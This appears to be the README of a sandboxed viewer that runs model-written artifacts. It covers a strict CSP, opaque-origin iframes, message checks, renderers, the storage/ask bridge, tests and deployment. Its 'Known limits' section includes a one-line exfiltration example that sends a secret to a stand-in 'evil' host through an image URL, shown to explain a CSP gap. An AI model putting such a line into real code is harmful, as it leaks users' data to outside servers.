# The artifact viewer

An **artifact** is a small live thing a bot makes: a page, a React component, an SVG, a Mermaid diagram, a Markdown document. The **viewer**
(`viewer/`) shows it. It is a Cloudflare Worker whose job is to hand the person's device one small page; the device does the rest. The
artifact is compiled and run **on the person's own device**, inside a sandbox with no network, so showing an artifact costs the server
nothing: no compile step, no render server, no per-view CPU. Every file the viewer serves is a static asset that the platform answers
without running any code of ours.

The contract between the app and the viewer is `tulmi/src/artifacts/protocol.ts` (both sides import it; the viewer does not change it).

```
 app (tailzu.space)                     viewer (its own site)
 ┌──────────────────────────┐   postMessage   ┌─────────────────────────────────────────────┐
 │ <iframe sandbox=         │ ──────────────▶ │ shell page  GET /                           │
 │   "allow-scripts"        │  load / stream  │   markdown · svg · mermaid · react render   │
 │   src=".../?type=react"> │ ◀────────────── │   here; an html artifact gets a frame of    │
 │                          │  ready / error  │   its own inside it                         │
 │ holds the session, calls │  storage / ask  │ no cookies · no storage · no network · no   │
 │ the API as the person    │  select / resize│ token. It only ever asks the app.           │
 └──────────────────────────┘                 └─────────────────────────────────────────────┘
```

Contents: [1 Security model](#1-security-model) · [2 What the app must do](#2-what-the-app-must-do) · [3 Renderers](#3-renderers) ·
[4 Element ids](#4-element-ids-point-and-change) · [5 Streaming](#5-streaming) · [6 Errors](#6-errors) · [7 The bridge](#7-the-bridge-windowtailzu) ·
[8 Design kit, theme, Tailwind](#8-design-kit-theme-tailwind) · [9 Sizes and times](#9-sizes-and-times) · [10 Vendoring](#10-vendoring) ·
[11 Tests](#11-tests) · [12 Deploy](#12-deploy) · [13 Known limits](#13-known-limits)

---

## 1. Security model

The artifact is code written by a model (or by someone who made it do so) and run for a person who did not read it. Assume it is hostile.
Everything below exists so that hostile code can draw on the screen and ask the app for things, and nothing else.

**A separate site.** The viewer is served from its own site, never the app's and never a subdomain of it. Cookies, storage and the same-site
checks of the app's site therefore do not exist for the viewer. Until a domain of its own is chosen it runs on
`tailzu-viewer.<account>.workers.dev`: `workers.dev` is on the [Public Suffix List](https://publicsuffix.org/), so every account's
`*.workers.dev` is its own site, different from `tailzu.space`. (It is the *same* site as the other Workers of the same account, e.g.
`tailzu-jobs`; none of them holds a cookie.) When there is a domain: a registrable domain of its own (`tailzuusercontent.example`),
not `viewer.tailzu.space`, and put it on `routes` in `wrangler.jsonc`.

**A sandbox, twice.** The app embeds the viewer with `sandbox="allow-scripts"` and no other token (no `allow-same-origin`, so the frame has
an *opaque origin*: `window.origin === "null"`; no `allow-popups`, `allow-forms`, `allow-top-navigation`, `allow-modals`, `allow-downloads`).
The shell's own CSP repeats it (`sandbox allow-scripts`), so the page is sandboxed even if someone opens it in a window or the app forgets
the attribute. An opaque origin has no cookies, no `localStorage`/`sessionStorage`/IndexedDB, and cannot read the app's DOM. An HTML
artifact then runs in a frame inside the shell that is sandboxed the same way and so has an opaque origin *different from the shell's*: it
cannot touch the shell at all, and the two talk by `postMessage` only (`web/frame.ts`).

**The CSP** (`src/csp.ts`, sent with `GET /`; inherited by the HTML artifact's frame):

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'none'` | nothing is allowed unless a line below says so |
| `script-src` | `'self' blob: 'sha256-…'` | the runtime and the vendored libraries (this origin), code the viewer compiles in the browser (`blob:`), and the one inline script, the import map, by hash |
| `style-src` | `'self' 'unsafe-inline' https://fonts.googleapis.com` | artifacts and the design kit write inline styles; Google Fonts CSS |
| `font-src` | `https://fonts.gstatic.com` | Google Fonts files |
| `img-src` | `data: blob: https:` | images; see [13](#13-known-limits) |
| `media-src` | `data: blob:` | |
| `connect-src` | `'none'` | `fetch`, XHR, WebSocket, EventSource, `sendBeacon`: all refused. **No network.** |
| `form-action`, `base-uri` | `'none'` | no form can leave, no `<base>` can redirect |
| `frame-ancestors` | `VIEWER_PARENT_ORIGINS` (`'none'` if empty or invalid) | only the app can embed it |
| `sandbox` | `allow-scripts` | see above |

*Why `blob:` and not `'unsafe-eval'`.* Compiling in the browser needs to turn a string of JavaScript into running code. Sucrase's output is
an ES module, and a module can be loaded from a `blob:` URL (`import(URL.createObjectURL(...))`), which also lets the page's import map
resolve its bare imports (`import { LineChart } from "recharts"`). `eval`/`new Function` would permit a whole class of injection that
`blob:` does not (strings reaching `eval` from the artifact's data), so `'unsafe-eval'` is not in the policy, and an artifact that calls
`eval` gets a CSP error that says so. The vendored libraries were checked for it: the only one that used `new Function`, d3-dsv's row reader
(`d3.csvParse`), is replaced at vendor time by the same function written as a closure (`scripts/vendor.mjs`). Inline event handlers and
inline `<script>` are not allowed either; HTML artifacts get them back by a transform, see [3](#3-renderers).

**No cookies, no storage, no token.** The Worker never sets or reads a cookie. The viewer's code uses none of `localStorage`,
`sessionStorage`, IndexedDB or `document.cookie` (a test greps for them), and holds no Tailzu credential: anything that needs the server
goes up to the app, which calls the API as the person. Messages that come down carry data, never a token.

**Messages are checked both ways.**
- *In:* a message is acted on only if `event.source === window.parent` **and** `event.origin` matches `VIEWER_PARENT_ORIGINS`
  (exact `scheme://host[:port]`, or `https://*.preview.example` for subdomains; the first message fixes the origin). A sibling frame, a
  popup or the artifact's own code posting to the viewer is ignored (tested).
- *Out:* `postMessage(msg, targetOrigin)` always names the parent's origin: the one the browser reports for the embedding page
  (`location.ancestorOrigins`, else the referrer) if it is allowed, else each configured origin in turn, so a message reaches only the page
  it is for. `ready` is sent the same way.
- *From an HTML artifact's frame:* the shell accepts a message only from a frame it created (by window identity), passes on only the six
  message kinds the artifact may send, rebuilds each from its known fields, and re-checks the limits of `LIMITS`.

**What a hostile artifact can still do** (and what the app must therefore do) is in [2](#2-what-the-app-must-do) and [13](#13-known-limits).

---

## 2. What the app must do

The viewer is half of a pair; the other half is the app's iframe handling. These are not optional.

1. **One iframe per artifact you open, with exactly `sandbox="allow-scripts"`.** An artifact can send its own frame somewhere else
   (`location.href = …`); nothing in a sandbox can stop that. The viewer posts an `error` ("navigated the viewer away") from `pagehide`,
   and the iframe's `load` event fires a second time. Treat either as "this frame is lost": destroy it, never send it another artifact,
   open a new one.
2. **Recognise the viewer by its window, not its origin.** Its origin is `"null"` (opaque). Check `event.source === iframe.contentWindow`,
   then validate the message as you would any untrusted input: the artifact's code can post any `FrameMsg` through the viewer (a `storage`
   write, an `ask`, a `download`); the viewer only guarantees they fit `LIMITS`. Meter `ask`, scope `storage` by artifact and person,
   and decide the file name of a `download` yourself (the name is the artifact's suggestion).
3. **Send with target origin `"*"`.** An opaque origin cannot be named. This is safe only because of rule 1, and because messages never carry
   a token.
4. **Open it as `…/?type=react`** when you know the type. The page then asks the browser for the compiler, Sucrase, React and React DOM at
   the same time as its own script, which saves about two round trips on a cold start. Without the hint everything still works.
5. **Wait for `ready`, then send `load`** (`ready` is sent once). Send `stream` as the source arrives and `{done: true}` at the end;
   `load` is a complete artifact and is rendered as final (scripts run, errors are reported). An empty `load` is fine: nothing is shown,
   nothing is reported, and the first `stream` starts the page.
6. **Size the iframe from `resize`** (the height of the content; fixed or absolutely positioned content is not counted, give such an
   artifact a fixed-height container). Pick your own minimum height.
7. **Links in an artifact do not open** (there is no popup and no navigation). The protocol has no "open link" message; see [13](#13-known-limits).

---

## 3. Renderers

| Type | How it is drawn | Loaded on demand |
|---|---|---|
| `markdown` | our own renderer (`lib/markdown.ts`) → HTML; **no raw HTML** (every `<` the author wrote is text); links only `https:`/`http:`/`mailto:`/`#anchor` with `rel="noopener noreferrer nofollow"`; images only `https:` or `data:` images; tables, task lists, fenced code, setext/ATX headings with ids | nothing |
| `svg` | sanitised from text (`lib/markup.ts`): only SVG elements, no `<script>`/`<foreignObject>`, no `on…` attributes, no `href` but `#local` or a data image, no CSS `url()` or `@import` that loads anything, no `animate`/`set` that targets an `href`; written out by us in one canonical form | nothing |
| `mermaid` | Mermaid, `securityLevel: "strict"`, theme from the app's | Mermaid (5.3 MB in 104 chunks, only the chunks the diagram needs) |
| `react` | TSX/JSX compiled **in the browser by [Sucrase](https://github.com/alangpierce/sucrase)** (about ten times lighter than Babel); `export default` is mounted into `#root` under an error boundary | compiler, Sucrase, React, React DOM, and each library the source imports |
| `html` | a frame of its own (below) | the frame bootstrap (7.5 KB) |

**React.** `lib/scan.ts` puts the element ids into the source ([4](#4-element-ids-point-and-change)), the imports are checked against the
import map (an unknown one is an `import` error that lists the libraries), Sucrase turns TypeScript and JSX into modern JavaScript (ES
modules stay; JSX becomes `jsx()` calls from `react/jsx-runtime`, so `import React` is optional), and the result is imported as a blob
module. Bare imports resolve through the page's **import map** to vendored, pinned ES builds, all sharing the one React:

| Import | Build | Notes |
|---|---|---|
| `react`, `react/jsx-runtime`, `react-dom`, `react-dom/client` | React 18.3.1 (development build, see [10](#10-vendoring)) | `createRoot` is the real one |
| `recharts` | 2.15.4 | |
| `lucide-react` | 0.577.0 | all icons in one file |
| `d3` | 7.9.0 | `d3.csvParse` works without `eval` |
| `three` | 0.186.1 | plus `three/addons/controls/OrbitControls.js` (also as `three/examples/jsm/controls/OrbitControls.js`) |
| `mermaid` | 12.2.0 | `import mermaid from "mermaid"` |

Any other import is a compile-time `import` error: relative imports ("an artifact is a single file"), URLs, unknown packages. Heavy
libraries are fetched only when something imports them. Everything the source names is started in parallel with the compiler. Tailwind is
described in [8](#8-design-kit-theme-tailwind).

**HTML.** An HTML artifact runs in an `iframe` the shell creates (a new one per version, so the old version's timers, listeners and globals
die with it). The CSP has no `'unsafe-inline'`, so `lib/markup.ts` reads the markup first and the frame's bootstrap (`web/frame.ts`, a
classic script appended last) does what the browser would have done:

- `<script>` bodies are taken out and run **in document order as blob scripts** (`type="module"` ones as blob modules, which can
  `import … from "d3"` by name; the frame has the same import map). Errors are mapped back to the line in the original HTML.
- `on…=` attributes become listeners (`this`, `event` and `return false` work), also for elements the artifact adds later with `innerHTML`.
- `<script src="https://…">`: refused with a reason (no network), except the CDN builds of **d3**, **three** and **Tailwind**, which are
  replaced by the vendored build under the usual global (`d3`, `THREE`, Tailwind's runtime). `<script type="text/babel">` is a clear
  compile error (use a `react` artifact). `<meta http-equiv="refresh">` and `<base>` are dropped. A fragment gets a doctype so it is laid
  out in standards mode.
- The page's scripts run after the real `DOMContentLoaded`, so the viewer fires `DOMContentLoaded` (and `load`, if it has already
  happened) once they have all run, for the listeners they added.

---

## 4. Element ids (point and change)

Every element the person can point at carries `data-tz-id="<line>:<col>"` (`ELEMENT_ID_ATTR`): 1-based line and column, in UTF-16 code
units, of the `<` that opens the element **in the artifact's original source**. The server finds the element's span from it.

- *React:* `lib/scan.ts` is a small lexer over the original text. It knows strings, template literals with `${}`, comments, regex
  literals, braces, and where a `<` can begin JSX (after an operator, an opening bracket, a keyword such as `return`) rather than mean
  less-than or a TypeScript type argument (after a name, a number, `)`, `]`). It inserts ` data-tz-id="…"` right after the tag name, so a
  later `{...props}` spread overrides it: a component's usage site wins over the `<div>` inside it. A `<` that looks like JSX but never
  closes (a type like `<T>(x: T) => T`) is put back and read as an operator. Fragments (`<>`, `<Fragment>`, `<React.Fragment>`) get no id.
  Every insertion is recorded, so a Sucrase syntax error, a stack frame or a source-map position can be mapped back to the original
  line and column. A test checks the scanner against **Sucrase's own tokenizer** on realistic artifacts.
- *HTML and SVG:* the same idea over a tokenizer for markup (`lib/markup.ts`); `html`, `head`, `title`, `meta`, `link`, `script`, `style`,
  `base`, `noscript` and `template` are not pointable and get none.
- *Markdown and Mermaid:* there is no `<` in the source, so no ids; select mode finds nothing to select.

In **select mode** (`select-mode {on: true}`) hovering outlines the element under the pointer (with its tag name), and a click sends
`select {elementId, tag, text (≤ 200 chars), rect}` and is **swallowed**: `click`, `pointer*`, `mouse*`, `touch*`, `dblclick`, context menu,
and Enter/Space never reach the artifact. The nearest ancestor with an id is chosen (a click on the inside of a Recharts `<path>` selects
the element around it).

---

## 5. Streaming

`stream {content, done}` messages re-render **debounced at 150 ms** (at most 400 ms between renders while chunks keep coming); `done: true`
renders at once.

- *Markdown, SVG:* re-rendered from the whole text and **morphed** into the page (`web/morph.ts`): nodes that did not change stay the same
  nodes, so animations keep running and nothing flickers. A half-written document renders as far as it goes (an open code fence is a code
  block; an unfinished tag is left out).
- *HTML:* the markup so far is morphed into one visible frame. Nothing runs while streaming. At `done` a complete frame is built out of sight
  (scripts run, handlers bind), then swapped in.
- *React:* a tick that does not compile is ignored, **silently**, and the last good render stays on screen. A tick that compiles but throws
  while rendering is replaced, inside the same commit, by the last good component. Only a *final* source that fails is an `error`, and even
  then the last good render stays (a runtime failure of a final source shows the error box). A tick identical to the last is skipped.
  (State is lost on each re-render; there is no hot reload.)
- *Mermaid:* each tick is tried; an invalid one keeps the last diagram.

---

## 6. Errors

All problems go to the app as `error {kind, message, line?, col?, stack?}`, **line and column in the artifact's original source** where
there is one. Errors during streaming are not reported until the source is final (half-written code always fails). At most 50 a load,
identical ones within 2 s once.

| kind | what | position |
|---|---|---|
| `compile` | Sucrase syntax error; a syntax error Sucrase let through (the browser's, e.g. a name declared twice); Mermaid parse error; JSX in HTML | line/col mapped through the id insertions; Mermaid's own line |
| `import` | not one of the libraries; relative import; URL import; an export the library does not have (`"lucide-react" has no export named "X"`); a library that failed to load; a blocked `<script src>` | the import statement, the name inside it, or the tag |
| `runtime` | a component that throws while rendering (boundary), `window.onerror`, unhandled rejections, errors in handlers/timers/scripts, errors at the top level of the module, a CSP refusal (no network, no `eval`) in words the bot can act on, a missing `default` export | from the stack, through the Sucrase source map and the id insertions |
| `limit` | content over `LIMITS.contentBytes`; a storage value over `storageValueBytes`; more than `storageKeys` keys; an `ask` over `askChars`; a `download` over `downloadBytes` | |

---

## 7. The bridge: `window.tailzu`

Available to React and HTML artifacts (read-only, non-configurable: an artifact cannot replace it). Each call becomes a `FrameMsg` with a
`reqId` and resolves on the matching `*-result`.

```js
await tailzu.storage.set("notes", { a: 1 });            // any JSON, up to LIMITS.storageValueBytes (64 KB)
await tailzu.storage.get("notes");                       // the value, or null
await tailzu.storage.set("poll", 3, { shared: true });  // seen by everyone who opens the artifact
await tailzu.storage.list("no");                         // keys that start with "no" (the prefix goes up as `key`)
await tailzu.storage.delete("notes");
const answer = await tailzu.ask("Summarise this");       // ≤ 8000 chars; the bot's text; metered by the app
await tailzu.download("report.csv", "text/csv", csv);    // string | Blob | ArrayBuffer | typed array, ≤ 5 MB
```

`LIMITS` are enforced in the viewer first (a violation rejects the promise **and** sends an `error` of kind `limit`); the key count is
tracked per session since the viewer holds no state, and the server holds the real count. A call the app never answers rejects after 20 s
(`ask`: 180 s); at most 64 wait at once. Results are matched by `reqId`; pending calls are dropped when another artifact is loaded.

---

## 8. Design kit, theme, Tailwind

- **Kit** (`load.kit`): `kit.css` becomes a `<style data-tz-kit>` placed **before** the artifact's own styles (in the shell's head; for HTML,
  before the frame's `<head>`), so artifacts use `var(--tz-…)` and the base styles, and still override them. `@import` of anything but
  Google Fonts is removed. `kit.fonts`: only `https://fonts.googleapis.com/css` or `css2` URLs become `<link rel=stylesheet>`; the CSP
  allows no other host. A new `load` replaces the kit; no kit removes it.
- **Theme** (`load.theme`): `data-theme`, `color-scheme` and a `.dark` class on `<html>`, in the shell and in HTML artifacts' frames;
  Mermaid switches its theme. Without it the system preference is used.
- **Tailwind**: Tailwind 4's browser runtime (`@tailwindcss/browser`, 72 KB gzip, vendored and pinned) is fetched **only** when `kit.tailwind`
  is set, or the artifact's classes look like Tailwind (`lib/tailwind.ts`: at least three different utilities that only Tailwind has, such
  as `p-4`, `text-gray-600`, `md:flex`, `rounded-lg`, `w-1/2`; `flex` or `container` alone prove nothing, because Tailwind's reset would
  restyle an artifact that styles itself), or an HTML page loads the Tailwind CDN script. `kit.tailwind.config` (a Tailwind 3 style
  `{theme: {extend: {colors, fontFamily, fontSize, spacing, borderRadius, boxShadow, screens, …}}}`) is converted to an `@theme` block
  (`tailwindConfigToCss`; plugins, content and safelist are ignored, the runtime scans the page itself). `dark:` follows the app's theme
  (the `.dark` class), not the system's.

---

## 9. Sizes and times

**First load** (`npm run build` prints it; `unit/size.test.ts` fails above 60 KB):

| | gzip |
|---|---|
| shell page (HTML + inline CSS + import map) | 1.5 KB |
| runtime (`main`, everything that is always loaded) | 17.4 KB |
| **shell + runtime, before any library** | **18.9 KB** (budget 60) |

**Loaded only when needed** (gzip, all immutable-cached): compiler 2.9 KB · React host 0.7 KB · HTML frame bootstrap 7.5 KB · Sucrase 42 KB ·
React 10 KB + JSX runtime 6 KB + React DOM 86 KB (development build; the production build is 3 KB + 1 KB + 44 KB) · Recharts 138 KB ·
lucide-react 156 KB (all icons) · d3 96 KB · three 188 KB (+ OrbitControls 4 KB) · Tailwind 72 KB · Mermaid entry 11 KB + chunks on demand
(1.5 MB gzip in all; a flowchart needs about 700 KB).

**Render times** for a small React artifact (a counter), headless Chromium, `wrangler dev` on the same machine, so **no network latency**:
add one round trip per sequential fetch on a real connection (the `?type=react` hint exists to make those parallel).

| | viewer-side (`rendered.ms`) | over the wire | requests |
|---|---|---|---|
| cold (empty cache): shell → counter on screen | **~60 ms** | 174 KB | 11 |
| warm (new page, libraries in the HTTP cache) | **~40 ms** | 2 KB | 11 (cached) |
| hot (viewer running, a new version) | **~5 ms** | – | – |
| cold, with recharts + lucide-react | ~120–170 ms | 471 KB | 13 |
| cold markdown (no library) | ~2 ms | 23 KB | 4 |
| cold Mermaid flowchart | ~390 ms | 739 KB | 33 |

(`e2e/perf.spec.ts` measures all of these and writes `test-results/perf.json`.) The 54 KB gzip that React's development build adds over the
production build is the price of error messages the bot can act on ("Element type is invalid … check the render method of `App`" instead of
"Minified React error #130"); see [10](#10-vendoring) to switch.

**Caching.** Everything but the shell has the hash of its content in its name, so it is served `Cache-Control: public, max-age=31536000,
immutable` with `Access-Control-Allow-Origin: *` (the sandboxed frame's requests are cross-origin) from `public/_headers`. The shell is
`max-age=300` (it carries the CSP, which depends on configuration). Static asset requests never run the Worker.

---

## 10. Vendoring

**Choice: the vendored libraries are NOT committed; they are fetched and built at build time (locally, in CI, on deploy).** Total is
8.0 MB in 115 files (5.3 MB of it Mermaid), above the ~6 MB line. What *is* committed pins them exactly:

- `vendor-src/package.json` + `vendor-src/package-lock.json`: the exact versions and the whole dependency tree with the registry's integrity
  hashes. `npm ci` refuses anything that does not match.
- `vendor.lock.json`: the SHA-256 of every output file. `npm run vendor -- --verify` rebuilds and fails on any difference (CI does).

`scripts/vendor.mjs` does: `npm ci` (in `vendor-src`) → esbuild bundles each library into **one ES module** with React and React DOM left as
bare imports (so every library shares the page's React; CommonJS `require("react")` inside a library is shimmed to the same) → writes
`public/vendor/<name>@<version>.<sha256-10>.js` (Mermaid already ships as ES modules with content-hashed chunks and is copied, into a
directory named by a hash of the tree) → writes `public/vendor/integrity.json` (SHA-384 of every file) and `manifest.json` (the import map
entries; not published).

| Command | |
|---|---|
| `npm run build` | vendors if `public/vendor` is missing or stale, bundles the runtime, writes `public/shell.html` (also run by `wrangler dev` and `wrangler deploy` through `build.command`) |
| `npm run vendor -- --force` | rebuild the libraries |
| `npm run vendor -- --verify` | rebuild and compare with `vendor.lock.json` |
| `npm run vendor -- --update-lock` | after changing a version |
| `npm run vendor -- --react=production` | ship React's production build (smaller, minified error messages) |

*Bumping a library:* edit `vendor-src/package.json`, `npm install --prefix vendor-src --ignore-scripts`, `npm run vendor -- --update-lock`, run
the tests, commit the two lock files. Needs the npm registry. Sucrase is built with its option checker stubbed out (the viewer passes fixed
options); d3-dsv is made `eval`-free (see [1](#1-security-model)).

---

## 11. Tests

```
cd viewer
npm ci && npm run build        # vendors from npm, bundles the runtime
npx tsc --noEmit
npx vitest run                 # unit (Node) + worker (workerd)
npx playwright install chromium && npx playwright test   # starts `wrangler dev` itself
npx wrangler deploy --dry-run --outdir dist
```

- **unit** (`unit/`): the id scanner (nested JSX, self-closing tags, strings and comments containing `<`, `{}` expressions, TypeScript
  generics, `\r\n`, half-written source, linear time; compared with Sucrase's tokenizer), HTML id injection/script/handler extraction, the SVG
  sanitiser, the Markdown renderer (including a raw-HTML attack corpus), origins, source maps, Tailwind helpers, the size budget.
- **worker** (`test/`, `@cloudflare/vitest-plugin`, real Workers Static Assets in workerd): headers and CSP (every directive, the import-map
  hash, `frame-ancestors` from config and fail-closed), the `/__host` gate, `/shell.html` hidden, immutable caching, CORS, content types and
  hashed names of every file in the import map, 304s.
- **e2e** (`e2e/`, Playwright + Chromium against `wrangler dev`): every type renders; React with Recharts + lucide; every `ARTIFACT_LIBS`
  import; syntax/import/runtime errors with the right line and column; select mode in React, HTML and SVG; streaming for every type;
  `fetch`/XHR/WebSocket/`eval` blocked; no cookies/storage; no navigation; forged messages ignored; storage/ask/download round trips;
  limits; kit; Tailwind; resize; embedding by a stranger refused; timings.

---

## 12. Deploy

1. `cd viewer && npm ci && npx wrangler login` (once).
2. Set the one setting in `wrangler.jsonc` (`vars`) or the dashboard: **`VIEWER_PARENT_ORIGINS`**, the origins of the app pages that embed
   the viewer, e.g. `https://tailzu.space,https://www.tailzu.space` (that is the default). `ENV` stays `production`.
3. `npx wrangler deploy` (runs the build; uploads ~130 static files and a 10 KB Worker). It prints the URL,
   `https://tailzu-viewer.<account>.workers.dev`.
4. Check: `curl -sI https://tailzu-viewer.<account>.workers.dev/` shows the CSP with your `frame-ancestors`; `/__host` is 404; a file under
   `/vendor/` has `cache-control: …immutable`; no `set-cookie` anywhere.
5. In the app, embed `https://tailzu-viewer.<account>.workers.dev/?type=<type>` as in [2](#2-what-the-app-must-do).
6. Later, with a domain: add it under `routes` (or the dashboard) and change the app's URL; `workers_dev` can then be set to `false`. Keep
   the viewer on a registrable domain of its own.

Locally: `npm run dev` (= `wrangler dev --var ENV:development`) serves the viewer and the test host at `http://127.0.0.1:8787/__host`.

CI (`.github/workflows/ci.yml`, job `viewer`) runs the same steps, with `npm run vendor -- --verify`.

---

## 13. Known limits

- **No "open link".** A link in an artifact does nothing (anchors `#x` scroll). The protocol has no message for it; a `{t: "open", url}`
  `FrameMsg` that the app confirms with the person would add it.
- **`img-src https:` is a one-way channel.** An image URL can carry data out (`new Image().src = "https://evil/?" + secret`). It is
  allowed because artifacts show remote pictures; the only secrets in the frame are the artifact's own data and what `ask` returned.
  Tighten `img-src` in `src/csp.ts` if that changes.
- **A frame can be navigated away by its own code**; see [2](#2-what-the-app-must-do), rule 1.
- **Artifact code can post any `FrameMsg`**, within `LIMITS`; the app must validate and meter.
- `stream` carries no artifact id or version; a chunk that arrives after the app has moved on to another artifact would be applied to the
  new one. Send `load` first and stop sending chunks of the old one.
- State of a React artifact is lost when a new version arrives (no hot reload).
- Source maps are used for positions only; nothing is sent to a debugger.
- Artifacts that need a library outside `ARTIFACT_LIBS` get a clear `import` error and are expected to be fixed by the bot.
- Tested in Chromium (Playwright) and workerd only. The browser features used (import maps, `import.meta.resolve`, `srcdoc` frames, blob modules,
  `ResizeObserver`) are in Safari 16.4+ and Firefox 106+; `location.ancestorOrigins` is not in Firefox, where the referrer or the configured
  list is used instead. Check a real iOS/Android WebView before relying on it.
